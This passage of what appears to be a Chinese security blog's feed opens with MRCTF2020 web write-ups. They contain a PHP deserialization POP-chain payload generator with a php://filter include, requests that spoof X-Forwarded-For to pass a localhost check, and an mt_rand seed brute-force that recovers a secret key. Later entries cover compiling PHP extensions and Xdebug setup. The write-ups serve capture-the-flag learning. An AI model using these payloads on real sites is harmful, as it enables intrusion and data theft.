&#125;</span><br></pre></td></tr></table></figure><p>运行下面代码，然后传值即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">'php://filter/convert.base64-encode/resource=flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;p = $a;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> Show();</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> Show();</span><br><span class="line">$d-&gt;source = $c;</span><br><span class="line">$e = serialize($d);</span><br><span class="line">print_r(urlencode($e));</span><br></pre></td></tr></table></figure><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure><p>发包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?b+u+p+t=23333%0a</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 932aa4a2-952c-4cfc-acf6-7b108c542156.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>然后是</p><p>jsfuck弹窗</p><p>post me Mera后，得到<code>secrettw.php</code>源码</p><p><code>secrettw.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写个unchange函数，因为读取数据的时候，会使用change函数，这样我们不能正常读取数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发包即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 932aa4a2-952c-4cfc-acf6-7b108c542156.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 20</span><br><span class="line"><span class="attribute">Referer</span>: localhost</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Client-Ip</span>: 127.0.0.1</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>网站存在<code>www.zip</code>备份文件</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>这里要得到<code>private_key</code>，很明显，我们要爆破得到种子，运行下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"></span><br><span class="line">$public_key = <span class="string">'KVQP0LdJKRaV3n9D'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($public_key);$i++)&#123;</span><br><span class="line">    $pos =  strpos($strings1,$public_key[$i]);</span><br><span class="line">    <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($strings1)<span class="number">-1</span>).<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到指定格式后，我们去爆破种子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>得到种子为<code>1775196155</code></p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">public_key();</span><br><span class="line"><span class="comment">//echo $Public_key;</span></span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br></pre></td></tr></table></figure><p>至于这里为什么要先调用<code>public_key()</code>，因为源码里调用了<code>public_key()</code>，这就意味着伪随机数的前16位是<code>public_key</code>，后12位才是<code>private_key</code></p><p>就做了这么多，剩下的两题有点难，会继续努力（逃～</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MRCTF2020_web(部分)&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>mac下使用phpize安装php扩展</title>
    <link href="http://0clickjacking0.github.io/2020/03/04/mac%E4%B8%8B%E4%BD%BF%E7%94%A8phpize%E5%AE%89%E8%A3%85php%E6%89%A9%E5%B1%95/"/>
    <id>http://0clickjacking0.github.io/2020/03/04/mac下使用phpize安装php扩展/</id>
    <published>2020-03-03T16:13:03.000Z</published>
    <updated>2020-03-04T05:03:04.269Z</updated>
    
    <content type="html"><![CDATA[<p>mac下使用phpize安装php扩展</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在PHP第一次编译的时候没有选择编译这个库，但是到后来又要用，pecl中又找不到对应的包，这时候我们只能编译源码来安装了</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先我们找到自己对应php版本的源码，<a href="https://www.php.net/releases/" target="_blank" rel="noopener">传送门</a></p><p>下载完成之后解压</p><p>这里我以5.6.40为例，进入到你想要安装库的目录，这里为以安装gd库来说明</p><p><img src="http://images.xianyu123.club/php_ext1.png" alt></p><p>gd扩展主要依赖zlib，freetype，libpng，libjpeg这4个库</p><p>所以我们先进行安装</p><p>依次执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew install zlib</span><br><span class="line">brew install freetype</span><br><span class="line">brew install libpng</span><br><span class="line">brew install libjpeg</span><br></pre></td></tr></table></figure><p>进入到对应的文件夹后，输入phpize，成功的话会显示对应的信息</p><p><img src="http://images.xianyu123.club/php_ext2.png" alt></p><p>执行即可，这里的二进制文件路径不一定跟我的一样，要写对路径，会出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --with-php-config=/Users/xianyu123/.phpbrew/php/php-5.6.40/bin/php-config --with-jpeg-dir=/usr/local/opt/libjpeg --with-png-dir=/usr/local/opt/libpng --with-freetype-dir=/usr/local/opt/freetype --with-zlib-dir=/usr/local/opt/zlib</span><br></pre></td></tr></table></figure><p>其中–with-php-config是指向安装php后生成的一个配置工具,主要用于扩展的编译配置</p><p>其他的参数对应指向先前安装依赖的位置</p><p>然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>然后就会在自己的php扩展中出现<code>gd.so</code>，这说明我们安装成功了</p><p><img src="http://images.xianyu123.club/php_ext6.png" alt></p><p>我们只需要在php.ini中加入一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=gd.so</span><br></pre></td></tr></table></figure><p>然后重启php-fpm即可完成</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac下使用phpize安装php扩展&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>php无参数RCE小结</title>
    <link href="http://0clickjacking0.github.io/2020/02/12/php%E6%97%A0%E5%8F%82%E6%95%B0RCE%E5%B0%8F%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2020/02/12/php无参数RCE小结/</id>
    <published>2020-02-12T13:38:18.000Z</published>
    <updated>2020-02-14T03:02:02.934Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$functions = get_defined_functions();</span><br><span class="line"><span class="comment">//print_r($functions);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($functions[<span class="string">'internal'</span>] <span class="keyword">as</span> $function_name)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^[a-zA-Z]+$/'</span>,$function_name,$match))</span><br><span class="line">            <span class="keyword">echo</span> $match[<span class="number">0</span>].PHP_EOL;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span
      
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>mac+phpstorm+php5.6+chrome+xdebug配置</title>
    <link href="http://0clickjacking0.github.io/2020/02/11/mac-phpstorm-php5-6-xdebug%E9%85%8D%E7%BD%AE/"/>
    <id>http://0clickjacking0.github.io/2020/02/11/mac-phpstorm-php5-6-xdebug配置/</id>
    <published>2020-02-11T02:52:31.000Z</published>
    <updated>2020-05-22T11:59:26.917Z</updated>
    
    <content type="html"><![CDATA[<p>mac+phpstorm+php5.6+chrome+xdebug配置</p><a id="more"></a><h2 id="0-环境说明"><a href="#0-环境说明" class="headerlink" title="0. 环境说明"></a>0. 环境说明</h2><p>macos15.2</p><p>php5.6</p><p>Phpstorm2018.2</p><p>nginx1.17</p><h2 id="1-安装xdebug"><a href="#1-安装xdebug" class="headerlink" title="1. 安装xdebug"></a>1. 安装xdebug</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pecl install xdebug-2.5.5</span><br></pre></td></tr></table></figure><h2 id="2-配置php-ini"><a href="#2-配置php-ini" class="headerlink" title="2. 配置php.ini"></a>2. 配置php.ini</h2><p>安装完成<code>xdebug</code>后会有提示语句</p><p><img src="http://images.xianyu123.club/xdebug2.png" alt></p><p>根据提示我们把下面这句话复制到<code>php.ini</code>中，因为我用的是phpbrew，所以路径可能有点不一样，大家根据自己实际<code>php.ini</code>的位置进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 